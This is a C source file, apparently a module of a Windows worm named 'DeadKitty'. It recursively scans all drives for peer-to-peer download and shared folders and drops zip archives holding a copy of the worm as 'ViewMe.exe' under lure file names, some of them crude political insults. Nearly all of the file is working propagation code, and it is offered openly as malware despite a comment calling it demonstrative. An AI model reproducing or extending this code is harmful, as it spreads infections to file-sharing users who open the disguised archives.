   /* The p2p directories scanner */

   #include "DeadKitty.h"

   /* shitty names ... this is a demonstrative worm, it will not spread in the wild :) */

   const char *P2Pnames[] = {
       "Freedom_for_Tibet.zip",
       "Fuck_Nazi.zip",
       "Fuck_Fascist.zip",
       "Fuck_Communist.zip",
       "Romano_Prodi_is_idiot.zip"
   };

   #define P2P_NAME_LEN 5

   /* drop worm in found directories */
   void CopyToP2P(char *dir)
   {
       /* choose zip's file name */
       srand(GetCurrentProcessId() ^ GetTickCount());
       SetCurrentDirectory(dir);
       MakeZip(P2Pnames[rand()%P2P_NAME_LEN],DeadKittyPath,"ViewMe.exe");
   }

   /* the real scanner */
   void Sc4n(char *Drive)
   {
       char sc[MAX_PATH],buf[MAX_PATH];
       WIN32_FIND_DATA in;
       HANDLE fd,file;
       char DropName[MAX_PATH];
       char *fm = "%s\\%s",*fm1 = "%s\\*.*";

       if(strlen(Drive) == 3)
       {
           Drive[2] = '\0';
       }

       sprintf(sc,fm1,Drive);
       fd = FindFirstFile(sc,&in);

       do
       {

           sprintf(buf,fm,Drive,in.cFileName);

           if(strcmp(in.cFileName,"..") != 0 && strcmp(in.cFileName,".") != 0
               && (in.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY))
           {

               /* check name of found directory */
               /* I look for "download", "shared", "incomplete", "complete", "coming" */

               if(strstr(in.cFileName,"ownload") || strstr(in.cFileName,"omplete")
                   || strstr(in.cFileName,"hare") || strstr(in.cFileName,"coming"))
               {
                   CopyToP2P(buf);
               }

               Sc4n(buf);
           }


       }while(FindNextFile(fd,&in));

       /* close all */
       FindClose(fd);
   }


   /* No thread this time :) */
   void P2PScanner(void)
   {
       char drive_cnt,DrivePath[32];
       int DriveType;


       while(1)
       {
           for(drive_cnt = 'C';drive_cnt <= 'Z';drive_cnt++)
           {
               sprintf(DrivePath,"%c:\\",drive_cnt);
               DriveType = GetDriveType(DrivePath);

               if(DriveType != 0 && DriveType != 1)
               {
                   Sc4n(DrivePath);
               }
           }

           WAIT(30);
       }
   }
